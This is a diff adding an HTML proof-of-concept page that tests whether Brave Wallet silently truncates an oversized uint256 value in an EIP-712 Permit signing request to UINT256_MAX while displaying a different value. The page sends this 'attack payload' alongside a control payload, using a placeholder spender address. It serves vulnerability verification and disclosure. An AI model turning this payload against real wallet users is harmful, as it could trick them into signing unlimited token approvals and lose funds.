@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Brave Wallet HexValueToUint256 Bypass — Verification DApp</title>
+  <style>
+    body { font-family: monospace; max-width: 800px; margin: 40px auto; padding: 20px; background: #1a1a1a; color: #e0e0e0; }
+    h2   { color: #ff6b6b; }
+    pre  { background: #2a2a2a; padding: 15px; border-radius: 6px; overflow-x: auto; font-size: 13px; }
+    button { background: #ff6b6b; color: white; border: none; padding: 12px 24px; font-size: 15px; cursor: pointer; border-radius: 4px; margin: 8px 4px; }
+    button:hover { background: #ff4444; }
+    .result { margin-top: 20px; padding: 15px; border-radius: 6px; }
+    .ok   { background: #1a3a1a; border: 1px solid #4caf50; }
+    .warn { background: #3a1a1a; border: 1px solid #ff6b6b; }
+    .info { background: #1a2a3a; border: 1px solid #4488ff; }
+    #log  { background: #111; padding: 15px; border-radius: 6px; min-height: 80px; font-size: 12px; line-height: 1.6; }
+  </style>
+</head>
+<body>
+
+<h2>Brave Wallet — HexValueToUint256 Bypass Verification</h2>
+
+<p>This page verifies whether Brave Wallet silently truncates an oversized
+uint256 hex value during EIP-712 signing, violating the WYSIWYS property.</p>
+
+<hr>
+
+<h3>Step 1 — Connect Wallet</h3>
+<button onclick="connectWallet()">Connect Brave Wallet</button>
+<div id="account_status" class="result info" style="display:none"></div>
+
+<h3>Step 2 — Send Attack Payload</h3>
+<p>Sends an EIP-712 <code>eth_signTypedData_v4</code> request with a 65-nibble
+value that should be rejected by a correct parser but is silently truncated
+to <code>UINT256_MAX</code> by the vulnerable one.</p>
+
+<pre>
+Displayed to user : 0x1FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF<span style="color:#ff6b6b">F</span>
+Should be signed  : ??? (truncated value if vulnerable, reject if patched)
+Expected if VULN  : 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</pre>
+
+<button onclick="sendAttackPayload()">Send Attack Payload (eth_signTypedData_v4)</button>
+<button onclick="sendLegitPayload()">Send Legit Payload (control — 64 nibbles)</button>
+
+<h3>Log</h3>
+<div id="log">Waiting...</div>
+
+<div id="result_box" class="result" style="display:none"></div>
+
+<script>
+const ATTACK_VALUE = "0x1FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"; // 65 nibbles
+const LEGIT_VALUE  = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";  // 64 nibbles = UINT256_MAX
+
+const DOMAIN = {
+  name: "TestToken",
+  version: "1",
+  chainId: 1,
+  verifyingContract: "0xCcCCccccCCCCcCCCCCCcCcCccCcCCCcCcccccccC"
+};
+
+const TYPES = {
+  EIP712Domain: [
+    { name: "name",              type: "string"  },
+    { name: "version",           type: "string"  },
+    { name: "chainId",           type: "uint256" },
+    { name: "verifyingContract", type: "address" }
+  ],
+  Permit: [
+    { name: "owner",    type: "address" },
+    { name: "spender",  type: "address" },
+    { name: "value",    type: "uint256" },
+    { name: "nonce",    type: "uint256" },
+    { name: "deadline", type: "uint256" }
+  ]
+};
+
+let account = null;
+
+function log(msg, color) {
+  const el = document.getElementById("log");
+  const ts  = new Date().toISOString().substr(11, 8);
+  el.innerHTML += `<span style="color:${color||'#aaa'}">[${ts}] ${msg}</span>\n`;
+}
+
+async function connectWallet() {
+  try {
+    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+    account = accounts[0];
+    const el = document.getElementById("account_status");
+    el.style.display = "block";
+    el.className = "result ok";
+    el.textContent = "Connected: " + account;
+    log("Wallet connected: " + account, "#4caf50");
+  } catch(e) {
+    log("Connection failed: " + e.message, "#ff6b6b");
+  }
+}
+
+async function sendPayload(valueHex, label) {
+  if (!account) { log("Connect wallet first", "#ffaa00"); return; }
+
+  const message = {
+    owner:    account,
+    spender:  "0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF",
+    value:    valueHex,
+    nonce:    0,
+    deadline: 1999999999
+  };
+
+  const typedData = {
+    domain:      DOMAIN,
+    types:       TYPES,
+    primaryType: "Permit",
+    message:     message
+  };
+
+  log(`Sending ${label}...`, "#4488ff");
+  log(`value field sent to wallet: ${valueHex}`, "#4488ff");
+  log(`Nibble count: ${valueHex.length - 2}`, "#4488ff");
+  log(">>> CHECK BRAVE WALLET UI — what value does it display? <<<", "#ffaa00");
+
+  try {
+    const sig = await window.ethereum.request({
+      method: "eth_signTypedData_v4",
+      params: [account, JSON.stringify(typedData)]
+    });
+
+    log("Signature returned: " + sig.substring(0, 30) + "...", "#4caf50");
+    log("", "");
+    log("=== VERIFICATION RESULT ===", "#ffaa00");
+    log("If the wallet displayed the FULL 65-nibble string but a signature", "#ffaa00");
+    log("was returned (not rejected), the WYSIWYS property is broken.", "#ff6b6b");
+    log("The signature is valid for UINT256_MAX regardless of what was shown.", "#ff6b6b");
+
+    const box = document.getElementById("result_box");
+    box.style.display = "block";
+    box.className = "result warn";
+    box.innerHTML = `
+      <b style="color:#ff6b6b">⚠ VULNERABLE if wallet displayed the oversized value and signed without error</b><br><br>
+      Sent value   : <code>${valueHex}</code><br>
+      Signed value : <code>UINT256_MAX</code> (if vulnerable)<br>
+      Signature    : <code>${sig.substring(0,66)}...</code><br><br>
+      Compare what Brave showed in the UI vs what was sent.
+      If they differ, the WYSIWYS property is violated.
+    `;
+
+  } catch(e) {
+    if (e.code === 4001) {
+      log("User rejected — test cancelled", "#ffaa00");
+    } else {
+      log("Error / rejected by wallet: " + e.message, "#4caf50");
+      log("If wallet rejected the oversized value, it may be patched.", "#4caf50");
+    }
+  }
+}
+
+function sendAttackPayload() { sendPayload(ATTACK_VALUE, "ATTACK (65 nibbles)"); }
+function sendLegitPayload()  { sendPayload(LEGIT_VALUE,  "LEGIT control (64 nibbles)"); }
+</script>
+
+</body>
+</html>
